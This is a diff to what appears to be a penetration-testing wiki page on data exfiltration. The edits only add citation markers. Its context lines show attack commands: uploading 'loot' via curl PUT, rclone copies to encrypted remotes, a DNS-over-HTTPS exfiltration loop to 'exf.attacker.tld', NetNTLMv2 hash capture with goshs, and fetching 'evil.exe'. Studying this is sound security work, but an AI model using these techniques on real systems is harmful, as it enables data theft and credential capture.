@@ -169,13 +169,13 @@ curl -X PUT --data-binary @loot.7z \
 Notes:
 - Pre-signed URLs / SAS tokens usually scope the **path**, **HTTP method**, and **expiration**.
 - For Azure Blob `Put Blob`, `x-ms-blob-type: BlockBlob` is mandatory.
-- This pattern works well with `curl`, `Invoke-WebRequest`, or any custom implant that can issue a raw HTTPS `PUT`.
+- This pattern works well with `curl`, `Invoke-WebRequest`, or any custom implant that can issue a raw HTTPS `PUT`.<sup>[[8]](#references)</sup>
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server` 
+[goshs](https://github.com/patrickhener/goshs) is a single-binary replacement for `python3 -m http.server`<sup>[[4]](#references)</sup>
 with upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links, 
-and OOB collaboration features (DNS, SMTP, NTLM hash capture).
+and OOB collaboration features (DNS, SMTP, NTLM hash capture).<sup>[[4]](#references)</sup>
 
 ```bash
 # Serve current directory on port 8000
@@ -287,7 +287,7 @@ while ($true) {
 
 Notes:
 - Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; adjust URL and JSON schema accordingly.
-- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see:
+- For DFIR of Discord Desktop cache artifacts and webhook/API recovery, see:<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -318,7 +318,7 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 ```
 
 Notes:
-- `crypt` can encrypt both file contents and names.
+- `crypt` can encrypt both file contents and names.<sup>[[3]](#references)</sup>
 - `chunker` transparently splits large files and reassembles them on download.
 - `rclone.conf` stores `crypt` secrets in an **obscured** form, not strong at-rest protection. For short-lived operations, prefer a dedicated temporary config and remove it afterwards. If you must keep it longer, prefer encrypted config handling (`RCLONE_CONFIG_PASS` / `--password-command`) over leaving a bare `rclone.conf` on disk.
 - If the target already syncs **OneDrive**, **Google Drive**, or **Dropbox**, copying loot into the synchronized directory can piggyback on an already-approved client instead of dropping a new transfer binary.
@@ -415,7 +415,7 @@ WindPS-2> cd new_disk:
 ```
 
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) is a single-binary alternative 
+[goshs](https://github.com/patrickhener/goshs) is a single-binary alternative<sup>[[4]](#references)</sup>
 that serves files over SMB and captures NetNTLMv2 hashes from connecting clients:
 
 ```bash
@@ -506,7 +506,7 @@ base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
   done
 ```
 
-On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.
+On the authoritative DNS server for `exf.attacker.tld`, sort the queries by the numeric prefix and reconstruct the Base32 stream. This keeps the transport inside HTTPS to the resolver instead of classic UDP/53 DNS.<sup>[[2]](#references)</sup>
 
 For full bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, etc.), check [the tunneling page](tunneling-and-port-forwarding.md).
 
@@ -520,7 +520,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) can spin up a quick SMTP server
+[goshs](https://github.com/patrickhener/goshs) can spin up a quick SMTP server<sup>[[4]](#references)</sup>
 to catch email callbacks during OOB exfiltration scenarios:
 
 ```bash
@@ -612,7 +612,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 
 ## Debug.exe
 
-The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
+The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.<sup>[[1]](#references)</sup>
 
 ```bash
 # Reduce the size
